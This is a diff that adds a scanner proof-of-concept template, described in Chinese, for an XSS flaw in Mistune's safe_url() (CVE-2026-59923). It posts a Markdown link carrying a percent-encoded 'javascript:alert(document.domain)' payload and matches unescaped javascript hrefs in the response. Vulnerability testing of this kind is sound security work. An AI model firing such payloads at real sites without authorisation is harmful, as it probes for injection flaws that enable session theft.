@@ -1,0 +1,32 @@
+[info]
+author = "ave"
+description = "检测Mistune HTMLRenderer.safe_url()是否对百分号编码的javascript URI进行过滤。向目标发送包含javascript%3Aalert(1)的Markdown链接，若响应中包含未转义的javascript:协议链接，则存在XSS漏洞。"
+id = "POC-AVE-2026-0864"
+name = "Mistune safe_url() XSS PoC"
+severity = "medium"
+tags = ["ave-2026-0864"]
+vuln_id = [
+    "CVE-2026-59923",
+    "AVE-2026-0864",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/render"
+protocol = "http"
+
+[poc.requests.body]
+content = "markdown=[click](javascript%3Aalert(document.domain))"
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "javascript%3Aalert",
+    'href="javascript',
+]
